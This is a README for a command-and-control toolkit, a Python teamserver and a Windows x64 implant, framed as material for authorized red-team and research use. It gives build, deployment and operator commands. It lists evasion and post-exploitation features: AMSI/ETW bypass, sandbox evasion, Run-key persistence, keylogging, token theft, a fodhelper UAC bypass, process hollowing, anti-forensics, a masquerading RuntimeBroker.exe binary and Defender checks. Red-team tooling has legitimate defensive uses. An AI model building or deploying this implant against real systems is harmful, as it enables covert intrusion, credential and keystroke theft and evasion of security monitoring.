# c2

Python teamserver and Windows x64 implant for authorized red-team / research use.

Use only on systems you own or have explicit permission to test. Unauthorized access is illegal. You’re responsible for how you use this.

## Layout

```
c2/          teamserver (Flask, CLI, SQLite, staging, DoH/pipe helpers)
implant.py   minimal Python beacon
client/      Windows x64 implant (MSVC / CMake)
infra/       optional Caddy redirector
tools/       Defender smoke helper
```

## Protocol

1. Implant registers (PSK → session key).
2. Beacons for tasks.
3. Operator queues work from the console.
4. Results return on the next beacon (large payloads via `/chunk`).

Payloads are AES-256-GCM. Default PSK is `change-me-shared-key` — change it before anything real.

Default client profile: HTTP to `127.0.0.1:8443`. TLS is optional (`C2_CERT`/`C2_KEY` on the server, or the Caddy edge in `infra/`).

## Server

```bash
pip install -r requirements.txt
python -m c2
```

| Var | Default | Notes |
|-----|---------|--------|
| `C2_HOST` / `C2_PORT` | `127.0.0.1` / `8443` | bind |
| `C2_PSK` | `change-me-shared-key` | must match implant |
| `C2_CERT` + `C2_KEY` | unset | HTTPS on the listener |
| `C2_DB` | `c2/data/c2.db` | SQLite (agents/tasks survive restart) |
| `C2_STAGE_KEY` | built-in | staging crypto |

```
c2> use
c2> shell whoami
c2> results
c2> download C:\path\to\file
c2> upload-stage payload.bin
c2> stage http://127.0.0.1:8443/stage/payload
```

`help` lists the rest.

```bash
python implant.py --host 127.0.0.1 --port 8443 --psk change-me-shared-key
```

## C++ client

Visual Studio C++ workload (2022+) and CMake. **x64 only.**

```powershell
cmake -S client -B client/build -G "Visual Studio 17 2022" -A x64
cmake --build client/build --config Release
```

Or open `client/c2_client.sln` → Release|x64. Output: `RuntimeBroker.exe`.

```powershell
cmake -S client -B client/build -A x64 `
  -DC2_HOST_OVERRIDE=127.0.0.1 `
  -DC2_PORT_OVERRIDE=8443 `
  -DC2_PSK_OVERRIDE=change-me-shared-key
```

Optional loader: `-DC2_LOADER=STOMP|APC|DOPPEL|HERPADERP` (default: none).

| Flag | Meaning |
|------|---------|
| `C2_EARLY_EVASION` | Unhook/AMSI before first check-in (can break WinHTTP) |
| `C2_SANDBOX_ABORT` | Exit on sandbox heuristics |
| `C2_PERSIST` / `C2_SELF_DEL` | Registry Run key / delay-delete |
| `C2_STRIP_RICH` | Strip MSVC Rich header after link (on by default) |
| `C2_EXTRA_PROFILES` | Embed front / DoH / pipe profiles |

Subsystem is Windows (no console). If the agent never appears: check PSK, host/port, x64 build, and AV.

Boot (default): bind ntdll → register → post-checkin harden → beacon with backoff, profile failover, and re-register on `unknown_agent`.

### What works

- Indirect syscalls, ntdll bind/restore, AMSI/ETW after check-in, stack spoof, Ekko sleep
- HTTP beacon; optional redirector / front / DoH / pipe
- Tasks: `shell`, `download`, `upload`, `sleep`, `whoami`, `rotate`, `stage`, `keylog`, `screenshot`, `clipboard`, `steal_token`, `smb_check`, `wmi_exec`, `dcom_trigger`, `uac_fodhelper`, `uac_mockdir`, `antiforensics`, `remote_inject`, `hollow`, `hijack_thread`
- Loaders: none (default), STOMP, APC; Doppel/Herpaderp are experimental
- String XOR, hashed exports, Rich strip, ASLR

`hollow` does section map + RIP set (ImageBase patch only — no full reloc engine). `hijack_thread` / `remote_inject` are helpers, not stealth loaders. Prefer `uac_fodhelper`; `uac_mockdir` is optional.

## Redirector

See `infra/README.md`. Teamserver on loopback HTTP, Caddy on `:443` for C2 paths.

## Smoke test

See `client/SMOKE_TEST.md`. Short path:

1. `python -m c2`
2. Run the Release implant
3. `use` → `shell whoami` → `results`
4. Restart the server — agent should still be in SQLite (or re-register)

```powershell
.\tools\validate_defender.ps1 -ExePath client\build\Release\RuntimeBroker.exe
```

Exit `2` means Defender CLI isn’t available, not “clean.”

## Limits

- Research / authorized testing codebase — not engagement-ready as-is
- Default transport is local HTTP; use certs or `infra/` for TLS at the edge
- Obfuscation helps against naive signatures; it does not make the binary undetectable

## License

Educational and authorized testing only. No warranty.
